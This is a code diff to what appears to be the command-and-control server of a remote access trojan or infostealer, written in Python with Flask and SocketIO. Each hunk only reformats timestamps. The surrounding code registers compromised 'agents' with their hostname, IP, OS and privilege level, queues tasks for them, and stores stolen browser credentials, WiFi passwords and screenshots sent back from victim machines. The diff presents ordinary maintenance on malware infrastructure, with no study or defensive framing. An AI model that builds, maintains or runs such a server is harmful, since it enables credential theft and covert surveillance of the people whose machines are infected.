@@ -42,7 +42,7 @@ def init_api_routes(app, socketio):
                       data['task_type'], 
                       json.dumps(data.get('task_data', {})),
                       'pending', 
-                      datetime.now().isoformat(), 
+                      datetime.now().isoformat().split('.')[0].replace('T', ' '), 
                       None))
             
             conn.commit()
@@ -90,7 +90,7 @@ def init_api_routes(app, socketio):
                       data.get('hostname', 'UNKNOWN'),
                       data.get('ip', '0.0.0.0'),
                       data.get('os', 'UNKNOWN'),
-                      datetime.now().isoformat(),
+                      datetime.now().isoformat().split('.')[0].replace('T', ' '),
                       'online',
                       data.get('privilege', 'user')))
 
@@ -105,7 +105,7 @@ def init_api_routes(app, socketio):
                                   cred.get('url', ''),
                                   cred.get('username', ''),
                                   cred.get('password', ''),
-                                  datetime.now().isoformat()))
+                                  datetime.now().isoformat().split('.')[0].replace('T', ' ')))
                     except Exception as e:
                         pass
 
@@ -118,7 +118,7 @@ def init_api_routes(app, socketio):
                                   '',
                                   wifi.get('ssid', ''),
                                   wifi.get('password', ''),
-                                  datetime.now().isoformat()))
+                                  datetime.now().isoformat().split('.')[0].replace('T', ' ')))
                     except Exception as e:
                         pass
 
@@ -136,7 +136,7 @@ def init_api_routes(app, socketio):
                                 VALUES (?, ?, ?, ?)''',
                              (None, data['agent_id'],
                               image_data,
-                              datetime.now().isoformat()))
+                              datetime.now().isoformat().split('.')[0].replace('T', ' ')))
                 except Exception as e:
                     pass
 
@@ -181,7 +181,7 @@ def init_api_routes(app, socketio):
             c = conn.cursor()
             
             c.execute('''UPDATE tasks SET status='completed', completed_at=?
-                         WHERE id=?''', (datetime.now().isoformat(), data['task_id']))
+                         WHERE id=?''', (datetime.now().isoformat().split('.')[0].replace('T', ' '), data['task_id']))
             
             c.execute("SELECT task_type, task_data FROM tasks WHERE id=?", (data['task_id'],))
             task = c.fetchone()
@@ -207,7 +207,7 @@ def init_api_routes(app, socketio):
                                 VALUES (?, ?, ?, ?)''',
                              (None, data['agent_id'], 
                               image_data,
-                              datetime.now().isoformat()))
+                              datetime.now().isoformat().split('.')[0].replace('T', ' ')))
                 except Exception as e:
                     pass
             
@@ -218,7 +218,7 @@ def init_api_routes(app, socketio):
                                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                  (None, data['agent_id'], cred.get('browser', ''), 
                                   cred.get('url', ''), cred.get('username', ''), cred.get('password', ''),
-                                  datetime.now().isoformat()))
+                                  datetime.now().isoformat().split('.')[0].replace('T', ' ')))
                     except Exception as e:
                         pass
             
